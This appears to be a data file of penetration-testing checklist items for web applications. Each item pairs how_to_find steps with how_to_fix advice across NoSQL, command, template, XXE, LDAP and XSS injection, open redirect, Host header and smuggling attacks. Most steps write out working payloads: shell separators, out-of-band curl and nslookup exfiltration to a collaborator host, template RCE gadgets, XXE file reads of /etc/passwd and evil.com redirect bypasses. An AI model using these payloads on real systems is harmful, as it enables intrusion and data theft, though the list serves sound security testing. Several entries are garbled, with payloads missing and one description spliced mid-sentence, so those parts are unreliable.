2) If you log in without valid creds (matching the first/any user), the auth query is injectable.
3) Target a user with {"user":"admin","pass":{"$ne":"x"}}.
4) Successful login = NoSQL auth bypass.

items.title: Test for blind boolean NoSQL injection
items.description: Where no data is returned, $regex and conditional operators let an attacker extract values character by character.
items.how_to_fix: Validate/cast inputs to expected types, reject operator objects, strip $-keys, and avoid $regex on user input. Add a regression test. VERIFY $regex/conditional payloads no longer alter responses.
items.how_to_find:
1) When no data is returned, use $regex to test conditions char-by-char, e.g. {"user":"admin","pass":{"$regex":"^a"}} and observe true (login/success) vs false responses.
2) Walk the regex prefix (^a, ^b, ^aa...) to extract the password/field one character at a time.
3) Automate with NoSQLMap or a Burp Intruder script.
4) Response divergence per regex guess = blind boolean NoSQLi.

items.title: Test for JavaScript injection ($where)
items.description: MongoDB $where and mapReduce evaluate server-side JavaScript, enabling logic bypass and potential resource exhaustion.
items.how_to_fix: Disable server-side JS ($where/mapReduce, set javascriptEnabled=false), never pass user input into $where, and use standard typed query operators instead. Add a regression test. VERIFY $where payloads don't execute.
items.how_to_find:
1) If input reaches a $where/mapReduce clause, inject JS: {"$where":"this.pass=='a'||'1'=='1'"} (logic bypass) or a sleep to confirm: {"$where":"sleep(5000)"}.
2) A consistent delay or bypassed filter proves server-side JS execution.
3) Also test injecting into string-built $where expressions (breaking out with quotes).
4) Executed JS / induced delay = $where injection (logic bypass + DoS).

items.title: Test for NoSQL syntax injection
items.description: Breaking out of the expected query syntax with special characters reveals injectable contexts and parsing flaws.
items.how_to_fix: Build queries with typed driver APIs (not string concatenation), validate/cast inputs, and reject malformed operator/object input. Add a regression test. VERIFY syntax-breaking payloads no longer error or alter the query.
items.how_to_find:
1) Inject special characters that break the query/JSON syntax: quotes, ' " ; { } [ ] , and operator fragments, and watch for DB/parse errors or behavior changes.
2) For string-concatenated Mongo queries, try closing the expression (e.g. "}]}) or a comment) to alter it.
3) Errors revealing the query structure indicate an injectable context.
4) Parsing errors/behavior change = NoSQL syntax injection.

items.title: Test for aggregation pipeline abuse
items.description: User-controlled aggregation stages or operators can leak unauthorized collection data and bypass access scoping.
items.how_to_find:
1) Find endpoints where user input controls aggregation stages/fields (sort, filter, $lookup, $group, projection).
2) Inject extra stages/operators, e.g. a $lookup to join an unauthorized collection (users, secrets) or a $match that removes tenant scoping, and see if unauthorized data is returned.
3) Try operator objects in fields expected to be scalars within the pipeline.
4) Any cross-collection/unscoped data returned = aggregation abuse.
items.how_to_fix: Never let users control pipeline stages/collection names; build the pipeline server-side, allow-list sortable/filterable fields, and always inject tenant/ownership $match. Add a regression test. VERIFY users can't add stages or read other collections.

items.title: Test for direct command injection
items.description: Output reflected from shell execution confirms attacker commands are run with the app context.
items.how_to_find:
1) Find inputs that may feed a shell (ping/host tools, file conversion, PDF/image processing, filenames).
2) Append command separators + a command whose output is reflected:
   ; id  , | id  , && whoami  , `id`  , $(id)  (and %0a newline).
3) If command output (uid=, hostname) appears in the response, it's direct command injection.
4) Test each separator; different shells parse differently.
items.how_to_fix: Avoid shells entirely - call binaries via argument-array APIs (execve/execFile/ProcessBuilder) with no shell interpolation, allow-list inputs, and never concatenate user input into a command string. Add a regression test. VERIFY injected separators/commands don't execute.

items.title: Test for blind/time-based command injection
items.description: When no output is reflected, deliberate delays prove command execution.
items.how_to_fix: Use shell-free argument-array execution, allow-list inputs, and never pass user data to a shell. Add a regression test. VERIFY delay/sleep payloads don't affect response time.
items.how_to_find:
1) When no output is reflected, inject a time delay and measure response time:
   ; sleep 5  , & ping -n 5 127.0.0.1 &  (Windows), || sleep 5 , `sleep 5`.
2) A consistent delay only when the payload fires confirms blind command execution.
3) Use conditional sleeps to infer data, or pivot to OOB.
4) Repeatable induced delay = blind command injection.

items.title: Test for argument injection
items.description: Even where shell metacharacters are filtered, injecting extra CLI flags into a binary can change its behavior dangerously.
items.how_to_fix: Even with argument-array execution, validate values that become CLI arguments, use -- to terminate option parsing, and allow-list expected inputs so attacker flags can't be injected. Add a regression test. VERIFY injected flags are treated as data, not options.
items.how_to_find:
1) Where user input becomes an argument to a binary (even without a shell), try injecting extra flags that change behavior:
   for curl: an input starting with -o/--output or -F to write files; for tar: --checkpoint-action=exec; for a value beginning with - the tool may parse it as an option.
2) Prefix inputs with - or -- and known dangerous flags for the target binary.
3) Changed behavior/file write/exec = argument injection.

items.title: Test for out-of-band command injection
items.description: Triggering DNS/HTTP callbacks from the server confirms injection and can exfiltrate command output.
items.how_to_fix: Use shell-free execution and input allow-listing, and block server outbound DNS/HTTP where feasible. Add a regression test. VERIFY no OOB callback is triggered by injected commands.
items.how_to_find:
1) When there's no reflected output or reliable timing, trigger a DNS/HTTP callback to Burp Collaborator:
   ; nslookup BURP-COLLAB  , | curl http://BURP-COLLAB/  , `nslookup $(whoami).BURP-COLLAB`.
2) Watch Collaborator for the callback (confirms execution) and exfiltrate command output via the subdomain (e.g. $(whoami).collab).
3) Any DNS/HTTP interaction = OOB command injection.

items.title: Test filter bypass via separators and encoding
items.description: Blocklists that strip some metacharacters can be bypassed with alternative separators, quoting, and variable tricks.
items.how_to_find:
1) When simple payloads are blocked, try alternative separators and evasions:
   newline %0a, $IFS instead of spaces (cat$IFS/etc/passwd), quoting (w'h'o'am'i), backslashes (who\ami), globbing (/???/c?t), and base64-decode pipes (echo <b64>|base64 -d|sh).
2) Bypass keyword blocklists with variable expansion (${PATH:0:1} for /).
3) If an evasion executes, the blocklist is incomplete.
4) Any working bypass = finding (report the underlying command injection).
items.how_to_fix: Don't rely on blocklists/filters - remove the shell and use argument-array execution with input allow-listing. Add a regression test. VERIFY encoded/alternate-separator payloads no longer execute.

items.title: Test Windows vs *nix payload variants
items.description: Command syntax differs by OS, so confirming the platform expands the working payload set.
items.how_to_fix: Regardless of OS, use shell-free argument-array execution and input allow-listing. Add a regression test. VERIFY OS-specific injection payloads don't execute.
items.how_to_find:
1) Fingerprint the OS (headers, error paths /etc vs C:\, prior findings), then use the matching syntax:
   *nix: ; id , | uname -a , `whoami` , $(id).
   Windows: & whoami , | dir , & ver , %COMSPEC%.
2) Separators differ (Windows uses & | && ||, not ;) and commands differ (dir vs ls, type vs cat).
3) Confirm with OS-appropriate delay (ping -n on Windows, sleep on *nix).
4) Output/delay with the correct variant = finding.

items.title: Detect SSTI with a polyglot probe
items.description: A simple math/concat probe quickly reveals whether input is evaluated as template code.
items.how_to_find:
1) Inject math/concat probes into every reflected parameter and see if they're EVALUATED (not echoed literally):
   ${7*7} , {{7*7}} , <%= 7*7 %> , #{7*7} , ${{7*7}} , a{{7*7}}b.
2) If the response shows 49 (or aa49bb), input is rendered as template code (SSTI), not just XSS.
3) Use the polyglot ${{<%[%'"}}%\ to trigger errors across engines.
4) Evaluated output = SSTI confirmed.
items.how_to_fix: Never render user input as part of a template; pass user data only as template variables/parameters (context data), not into the template source. Use a logic-less/sandboxed engine and add a regression test. VERIFY {{7*7}}-style probes are echoed literally, not evaluated.

items.title: Identify the template engine
items.description: Engine identification determines the exact payload set and exploitation path.
items.how_to_fix: Regardless of engine, keep user input out of template source and use sandboxed rendering. Add a regression test. VERIFY engine-specific probes don't evaluate.
items.how_to_find:
1) Once SSTI is confirmed, fingerprint the engine by which syntax evaluates:
   {{7*7}}=49 but {{7*'7'}} errors -> Jinja2/Python; {{7*'7'}}=7777777 -> Twig/PHP; ${7*7} -> Freemarker/JSP; <%= 7*7 %> -> ERB/Ruby; #{7*7} -> Ruby/Thymeleaf.
2) Follow PortSwigger's SSTI decision tree with distinguishing payloads.
3) Trigger a deliberate error to leak the engine name in a stack trace.
4) Identified engine drives the exact RCE payload.

items.title: Escalate Jinja2/Twig SSTI to RCE
items.description: Python and PHP template engines expose object internals that reach OS command execution.
items.how_to_fix: Don't compile templates from user input; run engines in a sandbox with dangerous attributes disabled and least-privilege. Add a regression test. VERIFY RCE gadget payloads don't execute commands.
items.how_to_find:
1) Jinja2 (Python): reach os via object internals, e.g.
   {{ ''.__class__.__mro__[1].__subclasses__() }} to find a gadget, then {{ cycler.__init__.__globals__.os.popen('id').read() }} or config.__class__.from_envvar tricks.
2) Twig (PHP): {{ ['id']|filter('system') }} or _self.env.registerUndefinedFilterCallback('system')... {{ _self.env.getFilter('id') }}.
3) Confirm with a harmless command (id/whoami) reflected or via OOB.
4) Command output = SSTI->RCE.

items.title: Test sandbox escape to RCE
items.description: Engines with sandboxes (e.g. Treat failures here as release blockers.
items.how_to_find:
1) When the engine runs a sandbox, look for known escapes/bypasses (attribute access, reflection gadgets, or engine CVEs) to reach dangerous objects despite the sandbox.
2) Jinja2: use request/config/lipsum/cycler globals to reach os even when __builtins__ are restricted.
3) Twig sandbox: abuse allowed filters/functions or _self to call disallowed ones.
4) A working escape that executes code = sandbox-escape RCE.
items.how_to_fix: Don't rely on the template sandbox as a security boundary - keep user input out of templates entirely, patch the engine, and restrict exposed globals/objects. Add a regression test. VERIFY sandbox-escape gadgets don't execute.

items.title: Test for blind SSTI
items.description: When template output is not reflected, side effects or OOB callbacks confirm evaluation.
items.how_to_fix: Keep user input out of templates and use sandboxed rendering; block server OOB egress as defense-in-depth. Add a regression test. VERIFY blind template payloads produce no side effect/callback.
items.how_to_find:
1) When template output isn't reflected (e.g. rendered into an email/PDF/background job), confirm evaluation via side effects: inject a payload that makes an OOB call, e.g. Jinja2 {{ cycler.__init__.__globals__.os.popen('nslookup BURP-COLLAB').read() }}.
2) Watch Burp Collaborator for the callback.
3) Alternatively cause a detectable error/delay.
4) Any OOB interaction/side effect = blind SSTI.

items.title: Test Freemarker/Velocity/ERB engines
items.description: Java and Ruby template engines expose Runtime/exec gadgets reachable from template context.
items.how_to_find:
1) Freemarker (Java): <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")} .
2) Velocity (Java): #set($e=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')) and read the output stream.
3) ERB (Ruby): <%= `id` %> or <%= system('id') %>.
4) Confirm with a harmless command (id) reflected or via OOB; command output = engine-specific SSTI->RCE.
items.how_to_fix: Keep user input out of templates, run these engines sandboxed/with restricted object access, patch them, and apply least-privilege. Add a regression test. VERIFY Runtime/exec gadget payloads don't execute.

items.title: Test classic XXE file read
items.description: External entity definitions can pull local file contents into the parsed/reflected XML response.
items.how_to_find:
1) Find endpoints accepting XML (Content-Type: application/xml, SOAP, or XML uploads).
2) Define an external entity and reference it in a reflected element:
   <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>.
3) If /etc/passwd (or c:/windows/win.ini) contents appear in the response, XXE file read works.
4) Try php://filter to base64 files that break XML.
items.how_to_fix: Disable DTDs/external entities in the XML parser (e.g. FEATURE_SECURE_PROCESSING, disallow-doctype-decl, setExpandEntityReferences(false), libxml_disable_entity_loader). Add a regression test. VERIFY external entities are not resolved.

items.title: Test for blind/OOB XXE exfiltration
items.description: When entity content is not reflected, an external DTD can exfiltrate file data via an out-of-band channel.
items.how_to_fix: Disable DTDs/external entities and block XML parser outbound network access. Add a regression test. VERIFY no OOB callback is made from XML input.
items.how_to_find:
1) When entity content isn't reflected, host an external DTD on Burp Collaborator and reference it:
   <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://BURP-COLLAB/x.dtd"> %ext;]> .
2) The DTD defines a parameter entity that reads a file and appends it to a Collaborator URL, exfiltrating data via DNS/HTTP.
3) Watch Collaborator for the callback (confirms blind XXE) and the leaked file content.
4) Any OOB callback = blind/OOB XXE.

items.title: Test for SSRF via XXE
items.description: External entities pointing at internal URLs turn the XML parser into an SSRF primitive.
items.how_to_find:
1) Point an external entity at an internal URL instead of a file:
   <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"> then reference &x;.
2) Target cloud metadata, internal services, and localhost ports; observe reflected content, errors, or timing differences to map internal hosts.
3) Combine with OOB DTD if responses aren't reflected.
4) Access to internal/metadata endpoints = SSRF via XXE.
items.how_to_fix: Disable external entities (removes the SSRF primitive); as defense-in-depth restrict the parser host's egress and block metadata endpoints. Add a regression test. VERIFY entities can't reach internal URLs.

items.title: Test for billion laughs DoS
items.description: Recursive entity expansion can exhaust memory/CPU and take down the service.
items.how_to_fix: Disable DTDs/entity expansion, or cap entity expansion depth/count and input size; use a hardened parser (secure processing). Add a regression test. VERIFY nested-entity payloads are rejected without resource exhaustion.
items.how_to_find:
1) Submit a recursive/nested entity payload (billion laughs):
   define lol1..lol9 where each expands the previous ten times, then reference &lol9; - expansion balloons to billions of chars.
2) Watch for high CPU/memory, slow response, or the worker crashing (test carefully on non-prod / with small depth first to avoid outage).
3) A quadratic-blowup variant works even without external entities.
4) Resource exhaustion/crash = entity-expansion DoS.

items.title: Test with parameter entities
items.description: Parameter entities (%) work where general entities are filtered and are key to blind exfiltration.
items.how_to_fix: Disable parameter entities and external DTD loading entirely (not just general entities); many parsers need explicit flags for this. Add a regression test. VERIFY %-parameter-entity payloads don't resolve.
items.how_to_find:
1) When general entities (&x;) are filtered, use parameter entities (%x;) which are processed in the DTD:
   <!DOCTYPE r [<!ENTITY % p SYSTEM "http://BURP-COLLAB/x.dtd"> %p;]> .
2) Chain nested parameter entities in an external DTD to exfiltrate files OOB (the standard blind-XXE technique).
3) A Collaborator callback confirms parameter-entity processing.
4) Any resolution/callback via %-entities = finding.

items.title: Test for XInclude attacks
items.description: When you cannot control the full XML document, XInclude can still pull external resources into a sub-element.
items.how_to_find:
1) When you only control a sub-element (not the whole XML doc, so you can't add a DOCTYPE), use XInclude:
   <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>.
2) If the file content is pulled into the response, XInclude processing is enabled.
3) Also target internal URLs (SSRF) via href.
4) File/URL content included = XInclude attack.
items.how_to_fix: Disable XInclude processing (setXIncludeAware(false)) and external resource loading in the parser. Add a regression test. VERIFY xi:include does not fetch local/remote resources.

items.title: Test XXE via SVG/DOCX/file upload
items.description: XML-based file formats parsed server-side (SVG, DOCX, XLSX) can carry XXE through upload features.
items.how_to_find:
1) Find uploads that parse XML-based formats server-side: SVG, DOCX/XLSX/PPTX (zip of XML), or plain XML.
2) Embed an XXE DOCTYPE/entity in the file (e.g. inside an SVG's XML, or in word/document.xml of a DOCX) referencing file:/// or an OOB DTD.
3) Upload and check the rendered output/thumbnail/response or Collaborator for leaked data.
4) File read or OOB callback from an uploaded document = XXE via upload.
items.how_to_fix: Disable DTDs/external entities in every server-side XML/office/SVG parser, and validate/sanitize uploaded documents. Add a regression test. VERIFY uploaded SVG/DOCX with entities don't resolve them.

items.title: Test for LDAP authentication bypass
items.description: Filter injection in bind/search queries can match any account and grant access.
items.how_to_find:
1) In a login backed by LDAP, inject filter metacharacters into the username:
   *  , *)(uid=*  , admin)(&)  , *)(|(uid=*  , and password * .
2) A wildcard/always-true filter like (uid=*)(&) can match the first/any account and log you in without valid creds.
3) Watch for successful auth or changed results.
4) Login without valid credentials = LDAP auth bypass.
items.how_to_fix: Escape LDAP special characters per RFC 4515 (or use parameterized/bound LDAP APIs), validate input, and never build filters by concatenation. Add a regression test. VERIFY wildcard/filter payloads no longer authenticate.

items.title: Test for blind LDAP injection
items.description: Differing responses to crafted filters let an attacker infer directory data without direct output.
items.how_to_fix: Escape LDAP metacharacters/use bound LDAP APIs and return uniform responses. Add a regression test. VERIFY crafted filter conditions don't produce observable response differences.
items.how_to_find:
1) When no directory data is reflected, inject conditions and compare responses (success/error/length):
   *)(attribute=value*  to test if an attribute value matches, walking characters like blind SQLi.
2) e.g. *)(userPassword=a*  vs *)(userPassword=b*  - a response difference reveals the value char-by-char.
3) Automate with Intruder.
4) Inferable data via response divergence = blind LDAP injection.

items.title: Test for LDAP filter injection
items.description: Injecting filter metacharacters can broaden search scope and break query logic.
items.how_to_fix: Escape LDAP filter metacharacters ( ( ) * \ NUL ) per RFC 4515 or use parameterized LDAP queries; validate/allow-list input. Add a regression test. VERIFY injected filter metacharacters are treated as literals.
items.how_to_find:
1) Inject LDAP filter metacharacters ( ) * & | into search parameters and watch for errors or a broadened result set.
2) A * wildcard often returns all entries; adding )(objectClass=*) can widen the query; a malformed ) may throw an LDAP error confirming injection.
3) Compare result counts with/without the payload.
4) Extra/all results or LDAP errors = filter injection.

items.title: Test for attribute disclosure
items.description: Wildcard and added clauses can expose attributes the application never intended to return.
items.how_to_find:
1) Use wildcards/added clauses to pull attributes the app didn't intend to return:
   *)(uid=*))(|(uid=*  , or inject to add attributes like mail, memberOf, userPassword to the result.
2) Compare responses to see if extra directory attributes (emails, group membership, hashes) leak.
3) Broadening the search with * can dump many records' attributes.
4) Exposure of unintended attributes = attribute disclosure.
items.how_to_fix: Escape input/use bound LDAP queries, request only the specific attributes needed (attribute allow-list), and apply directory ACLs. Add a regression test. VERIFY injection can't expose extra attributes.

items.title: Test for reflected XSS
items.description: Input reflected unencoded into the immediate response executes script in the victim browser.
items.how_to_find: 1) Inject a unique marker (e.g. xss123) into each parameter (query, body, headers) and find where it's reflected in the response. 2) At each reflection, test a context payload: in HTML body or ; in an attribute ">
items.how_to_fix: Context-aware output encoding (HTML/attr/JS/URL) via the framework's auto-escaping, plus a strict CSP as defense-in-depth; never build HTML from raw input. Add a regression test. VERIFY the payload is rendered as text, not executed.

items.title: Test for stored XSS
items.description: Payloads persisted server-side execute for every user who views the affected content, raising impact significantly.
items.how_to_find: 1) Submit payloads into fields that get saved and later displayed (comments, profile name/bio, filenames, support tickets, admin logs). 2) Use context payloads like / , then view the page(s) that render the stored value - including other users'/admin views. 3) Execution when the content is viewed = stored XSS (higher impact than reflected). 4) Track where each stored value surfaces.
items.how_to_fix: Context-aware output encoding when rendering stored data (and sanitize rich HTML with a vetted library like DOMPurify), plus a strict CSP; encode on output, not just input. Add a regression test. VERIFY stored payloads render as text everywhere they appear.

items.title: Test for DOM-based XSS
items.description: Client-side JavaScript that writes untrusted source data into a dangerous sink executes without server involvement.
items.how_to_find: 1) In DevTools, trace sources (location.hash/search, document.referrer, postMessage, localStorage) flowing into sinks (innerHTML, document.write, eval, setTimeout, jQuery .html()). 2) Put a payload in the URL fragment (which the server never sees): https://target/# and watch it hit a sink. 3) Use DevTools breakpoints / DOM Invader to confirm the source->sink flow. 4) Execution purely client-side = DOM XSS.
items.how_to_fix: Use safe DOM APIs (textContent, setAttribute) instead of innerHTML/eval, sanitize with DOMPurify before any HTML sink, and enable Trusted Types + CSP. Add a regression test. VERIFY tainted sources can't reach dangerous sinks.

items.title: Test for blind XSS
items.description: Payloads firing in back-office/admin contexts you cannot see require an out-of-band callback to detect.
items.how_to_find:
1) Inject payloads that call back to a collector (XSS Hunter / Burp Collaborator) into fields likely viewed later by staff/admin (contact forms, user-agent, support tickets, log-viewers):
   "><script src=//YOUR-COLLECTOR></script>.
2) Wait for the callback with page URL/DOM/cookies when an admin views it.
3) A received callback = blind XSS firing in a context you can't see.
4) Seed many fields with unique markers to locate the sink.
items.how_to_fix: Context-aware output encoding everywhere untrusted data is rendered - including admin/internal pages and log viewers - plus a strict CSP. Add a regression test. VERIFY payloads don't execute in back-office views.

items.title: Test attribute context breakouts
items.description: Reflection inside an HTML attribute can be escaped to inject new attributes or close the tag and run script.
items.how_to_find:
1) When your input lands inside an HTML attribute (value="...HERE..."), test breaking out:
   "><svg onload=alert(1)>  (close attr+tag), or if you can't escape quotes, inject a new event handler: " onmouseover=alert(1) x=" .
2) For unquoted attributes, a space plus onfocus=alert(1) autofocus can execute.
3) In href/src, try javascript:alert(1).
4) A firing payload from attribute context = finding.
items.how_to_fix: Attribute-context output encoding (encode quotes and always quote attributes), never place user input in event-handler/URL attributes unsanitized, plus CSP. Add a regression test. VERIFY input can't break out of the attribute.

items.title: Test filter and WAF bypass
items.description: Blocklist filters often miss alternate tags, event handlers, encodings, and casing that still execute.
items.how_to_find: 1) When
items.how_to_fix: Fix the XSS at the sink with context encoding/sanitization (don't rely on the WAF/blocklist); keep the WAF as defense-in-depth. Add a regression test. VERIFY evasion payloads no longer execute.

items.title: Test CSP bypass
items.description: A weak or misconfigured Content-Security-Policy can be bypassed, allowing XSS even where a policy exists.
items.how_to_find:
1) Read the Content-Security-Policy header and look for weaknesses: unsafe-inline, unsafe-eval, wildcard/overly-broad sources, or whitelisted CDNs hosting JSONP/AngularJS gadgets.
2) With an existing XSS, craft a payload the CSP allows: load a script from a whitelisted host, use a JSONP endpoint, or abuse a framework gadget (e.g. Angular) to execute.
3) Use Google CSP Evaluator to spot bypassable policies.
4) Script execution despite CSP = CSP bypass.
items.how_to_fix: Deploy a strict nonce/hash-based CSP (drop unsafe-inline/unsafe-eval and broad whitelists), add object-src 'none' and base-uri 'none'; CSP is a backstop - still fix the XSS. Add a regression test. VERIFY the policy blocks injected script.

items.title: Test for mutation XSS (mXSS)
items.description: Browser HTML re-parsing/normalization can mutate sanitized markup back into executable script, bypassing sanitizers.
items.how_to_find:
1) Target flows that sanitize HTML then re-insert it via innerHTML (browser re-parses/normalizes it). 2) Feed markup that mutates on re-parse, e.g. payloads inside

). 3) Confirm the sanitized output executes after the browser mutates it. 4) Execution post-sanitization = mXSS.
items.how_to_fix: Use an actively-maintained sanitizer (DOMPurify) that accounts for mXSS, avoid re-serializing/re-parsing sanitized HTML, prefer textContent, and add CSP. Add a regression test. VERIFY mutated markup doesn't execute.

items.title: Test with XSS polyglots
items.description: A single polyglot payload that works across multiple contexts speeds discovery where the injection context is unknown.
items.how_to_find:
1) When you don't know the context, inject a polyglot that fires in HTML, attribute, and JS contexts at once, e.g.:
   jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
2) Watch every reflection to see where it executes, then simplify to a clean context-specific PoC.
3) Speeds discovery across many params.
4) Any execution = XSS (refine per context).
items.how_to_fix: Apply context-aware output encoding/sanitization at every sink plus a strict CSP. Add a regression test. VERIFY the polyglot is neutralized in all contexts.

items.title: Test for client-side template/framework XSS
items.description: Client-side template engines (AngularJS, Vue, Handlebars) can evaluate expressions, turning injection into execution.
items.how_to_find:
1) If the app uses a client-side template engine, inject template expressions where input is bound:
   AngularJS: {{constructor.constructor('alert(1)')()}} or {{7*7}} to test evaluation; Vue: similar mustache {{...}}; Handlebars where triple-braces {{{ }}} output raw HTML.
2) A math probe rendering 49 shows the expression is evaluated (client-side template injection), which can escalate to XSS/sandbox escape.
3) Executed expression = framework template XSS.
items.how_to_fix: Don't render user input into client-side templates; bind data as text, avoid triple-brace/raw output and eval-like helpers, and upgrade off sandbox-reliant engines (old AngularJS). Add CSP + regression test. VERIFY template-expression probes aren't evaluated.

items.title: Test for parameter-based open redirect
items.description: Redirect parameters that accept arbitrary external URLs let an attacker control the destination.
items.how_to_find:
1) Find redirect params (returnUrl, next, url, redirect, dest, continue) in login/logout/link flows.
2) Set the value to an external URL and follow the redirect:
   ?next=https://evil.com  , ?url=//evil.com  .
3) If you land on evil.com (check the Location header / final URL), it's an open redirect (phishing/token-leak risk).
4) Note whether it's a 30x header redirect or a JS/meta redirect.
items.how_to_fix: Don't redirect to user-supplied absolute URLs; allow-list permitted destinations or use server-side mapping keys, and only accept relative paths (reject //, http(s):, backslashes). Add a regression test. VERIFY external URLs are refused.

items.title: Test for header-based redirect
items.description: Redirects driven by request headers (Referer, custom routing headers) can be abused where a parameter is not obvious.
items.how_to_fix: Never build redirects from request headers (Host/Referer); use a fixed canonical host and allow-listed relative destinations. Add a regression test. VERIFY header manipulation can't change the redirect target.
items.how_to_find:
1) When there's no obvious redirect param, test header-driven redirects: change the Host header or Referer and see if the Location reflects it.
2) e.g. set Host: evil.com and check if a redirect/link points to evil.com.
3) Also test X-Forwarded-Host and other routing headers.
4) A redirect target controlled via headers = header-based open redirect.

items.title: Test redirect filter bypass techniques
items.description: Naive validators that allow-list a substring or only block http(s) can be bypassed with URL tricks.
items.how_to_find:
1) When a validator blocks external URLs, try bypasses:
   //evil.com , https:evil.com , /\evil.com , https://trusted.com@evil.com , https://evil.com#trusted.com , https://evil.com?trusted.com , whitespace/encoding (%2f%2f, %00), and case tricks.
2) Substring allow-lists (contains 'trusted.com') fall to trusted.com.evil.com or evil.com/trusted.com.
3) Confirm the final landing host is attacker-controlled.
4) Any bypass reaching evil.com = finding.
items.how_to_fix: Parse the URL and compare the host against an allow-list (don't substring-match), reject protocol-relative/backslash/userinfo tricks, and prefer relative-only redirects. Add a regression test. VERIFY all bypass variants are refused.

items.title: Test open redirect in OAuth/SSO chains
items.description: An open redirect on an allow-listed redirect_uri can leak OAuth codes/tokens, escalating to account takeover.
items.how_to_find:
1) In OAuth/SSO, tamper with redirect_uri: try appended paths, subdomains, or an open redirect on the trusted app that the provider still accepts.
2) If you can redirect the flow through an open redirect on an allow-listed host, the authorization code/token (in query or fragment) leaks to your server (Referer or the redirect chain).
3) Capture the leaked code/token and exchange it -> account takeover.
4) Any code/token leaking off-domain = high-impact finding.
items.how_to_fix: Exact-match redirect_uri against registered values (no partial/prefix match), fix open redirects on trusted hosts, and use PKCE + short-lived single-use codes. Add a regression test. VERIFY modified redirect_uri values are rejected.

items.title: Test password-reset poisoning
items.description: If reset links are built from the Host header, an attacker can make the link point at their server and steal tokens.
items.how_to_fix: Build reset links from a server-side configured base URL, not the Host header; validate Host against an allow-list of expected domains at the edge. Add a regression test. VERIFY the reset link host can't be changed via headers.
items.how_to_find:
1) Trigger a password reset while tampering the Host header (or adding X-Forwarded-Host: evil.com).
2) Check the received reset email - if the link points to evil.com, the app built it from the Host header.
3) A victim clicking the link sends their reset token to your server -> account takeover.
4) Reset link host controlled by header = finding.

items.title: Test for web cache poisoning
items.description: A reflected Host/forwarding header cached in a response can serve attacker-controlled content to other users.
items.how_to_fix: Don't reflect unkeyed headers (Host/X-Forwarded-*) into cacheable responses; include such inputs in the cache key or strip them, and set correct Cache-Control/Vary. Add a regression test. VERIFY a poisoned header can't be served to other users.
items.how_to_find:
1) Find a header (X-Forwarded-Host, X-Forwarded-Scheme, etc.) reflected into a cacheable response (e.g. an absolute URL in the body).
2) Send the request with an evil value and check for cache headers (X-Cache: hit, Age); confirm the poisoned response is served to a fresh request without the header.
3) Use Param Miner to find unkeyed inputs.
4) A cached response reflecting your value to others = cache poisoning.

items.title: Test for routing-based SSRF via Host
items.description: Front-end proxies that route by Host can be tricked into forwarding requests to internal systems.
items.how_to_find:
1) Against front-end proxies that route by Host, set the Host (or use absolute-URI request line) to an internal target:
   Host: 169.254.169.254  , Host: localhost  , or an internal hostname.
2) If the proxy forwards your request there, you get responses from internal systems (SSRF) - watch for changed content, errors, or OOB callbacks.
3) Try X-Forwarded-Host and connection-reuse tricks.
4) Access to internal hosts via Host = routing-based SSRF.
items.how_to_fix: Configure the proxy to route on a fixed allow-list (not arbitrary Host), reject unknown Hosts, and isolate internal services. Add a regression test. VERIFY a spoofed Host can't reach internal targets.

items.title: Test for web cache deception
items.description: Tricking caches into storing authenticated pages under static-looking paths can expose private data.
items.how_to_fix: Cache only by content-type/explicit rules (not by extension), don't cache authenticated responses, and make the origin honor the real path (return 404 for /account/x.css). Add a regression test. VERIFY private pages aren't cached under static-looking URLs.
items.how_to_find:
1) Append a fake static suffix to an authenticated page: /account/settings/nonexistent.css (or .jpg).
2) If the origin still returns your private page but the CDN caches it (because it looks static), request the same URL unauthenticated / as another user.
3) If you receive the victim's private content, the cache stored it = web cache deception.
4) Check X-Cache/Age headers to confirm caching.

items.title: Test X-Forwarded-Host and related header abuse
items.description: Apps often trust forwarding headers even when the Host header is validated, reopening the same attacks.
items.how_to_find:
1) When the Host header is validated, retry the same attacks (reset poisoning, cache poisoning, redirects) using forwarding headers the app may still trust:
   X-Forwarded-Host, X-Host, X-Forwarded-Server, X-Original-URL, X-Rewrite-URL, Forwarded.
2) Also try duplicate Host headers and an absolute URI in the request line.
3) Observe reflected links/redirects to see which header the app trusts.
4) Any attack working via a forwarding header = finding.
items.how_to_fix: Only trust forwarding headers from known proxies (strip/override them at the edge), and derive URLs from server config, not client headers. Add a regression test. VERIFY spoofed X-Forwarded-* headers have no effect.

items.title: Apply smuggling detection methodology
items.description: Timing-based and differential probes reveal whether front-end and back-end disagree on request length.
items.how_to_fix: Use HTTP/2 end-to-end (no downgrade), make front-end and back-end agree on length parsing, reject ambiguous CL+TE requests, and disable connection reuse to the back-end where possible. Add a regression test. VERIFY ambiguous requests are rejected. NOTE: smuggling tests can disrupt other users - test carefully.
items.how_to_find:
1) Use Burp's HTTP Request Smuggler extension to run detection.
2) Send timing-based probes: a request that, if the back-end waits for more body (desync), causes a measurable delay.
3) Send a CL.TE/TE.CL probe and look for a differential response (the smuggled prefix affecting the next request).
4) A time delay or differential response indicating front-end/back-end length disagreement = smuggling.

items.title: Test for CL.TE smuggling
items.description: Front end uses Content-Length while back end uses Transfer-Encoding, allowing a request prefix to be smuggled.
items.how_to_fix: Normalize/reject requests containing both Content-Length and Transfer-Encoding, use HTTP/2 end-to-end, and ensure front-end and back-end use the same header. Add a regression test. VERIFY CL.TE payloads don't smuggle. NOTE: test carefully to avoid impacting others.
items.how_to_find:
1) Front-end uses Content-Length, back-end uses Transfer-Encoding. Send a request with both headers where TE: chunked terminates early (0\r\n\r\n) but CL includes a smuggled prefix.
2) The back-end treats the leftover bytes as the start of the next request - confirm by making the next request receive your smuggled prefix (e.g. a 404 or reflected path).
3) Use Burp Smuggler's CL.TE probe.
4) The smuggled prefix affecting a following request = CL.TE.

items.title: Test for TE.CL smuggling
items.description: Front end uses Transfer-Encoding while back end uses Content-Length, enabling a different smuggling primitive.
